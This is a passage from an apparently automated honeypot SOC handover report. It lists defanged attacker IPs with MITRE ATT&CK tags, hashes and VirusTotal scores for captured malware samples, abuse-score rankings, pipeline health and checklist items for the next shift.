| `114.29.11[.]190` | 1 | 2026-06-14 09:31 | 2026-06-14 09:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.80.32[.]225` | 1 | 2026-06-14 05:37 | 2026-06-14 05:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.161[.]6` | 1 | 2026-06-14 08:09 | 2026-06-14 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.173[.]110` | 1 | 2026-06-14 05:56 | 2026-06-14 05:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.16.132[.]80` | 1 | 2026-06-14 08:18 | 2026-06-14 08:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `122.13.25[.]186` | 1 | 2026-06-14 08:34 | 2026-06-14 08:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.103.51[.]92` | 1 | 2026-06-14 08:33 | 2026-06-14 08:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-06-14 04:48 | 2026-06-14 04:48 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.123[.]167` | 1 | 2026-06-14 07:48 | 2026-06-14 07:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.220.244[.]134` | 1 | 2026-06-14 09:33 | 2026-06-14 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.173.79[.]220` | 1 | 2026-06-14 07:29 | 2026-06-14 07:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `175.46.253[.]75` | 1 | 2026-06-14 04:53 | 2026-06-14 04:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-06-14 06:25 | 2026-06-14 06:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.115.171[.]100` | 1 | 2026-06-14 09:27 | 2026-06-14 09:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.42.21[.]94` | 1 | 2026-06-14 08:38 | 2026-06-14 08:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `192.227.213[.]228` | 1 | 2026-06-14 09:24 | 2026-06-14 09:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.141.79[.]94` | 1 | 2026-06-14 09:07 | 2026-06-14 09:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.50.134[.]129` | 1 | 2026-06-14 09:33 | 2026-06-14 09:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.100.183[.]18` | 1 | 2026-06-14 06:21 | 2026-06-14 06:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `4.211.84[.]189` | 1 | 2026-06-14 09:19 | 2026-06-14 09:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.100.25[.]13` | 1 | 2026-06-14 05:45 | 2026-06-14 05:45 | 15s | 0 | `T1592` | 🟢 LOW |
| `43.133.61[.]150` | 1 | 2026-06-14 09:36 | 2026-06-14 09:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.164.132[.]164` | 1 | 2026-06-14 07:49 | 2026-06-14 07:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.240.17[.]66` | 1 | 2026-06-14 09:22 | 2026-06-14 09:24 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `114.29.11[.]190` | KR | HVChungnam | **100** ⚠️ | 15 |
| `92.204.138[.]58` | US | Host Europe GmbH | **100** ⚠️ | 5 |
| `176.120.37[.]97` | UA | Langate Ltd | **100** ⚠️ | 17 |
| `118.16.132[.]80` | JP | NTT DOCOMO,INC. | **100** ⚠️ | 12 |
| `43.164.132[.]164` | KR | ACEVILLE PTE.LTD. | **100** ⚠️ | 5 |
| `123.103.51[.]92` | CN | ChinaNetCenter Ltd. | **100** ⚠️ | 11 |
| `185.42.21[.]94` | CO | LIBERTY NETWORKS DE COLOMBIA S.A.S | **100** ⚠️ | 18 |
| `119.96.174[.]235` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `43.133.61[.]150` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 266 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 153 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 76 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 37 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 36 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 867 cases |
| Tool 34  | Credential Extractor        | ✅ 229 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 52 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 76 priority case(s) shown individually · 43 recon entry/entries in table (18 group(s) consolidating 758 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-14T09:41:33Z_
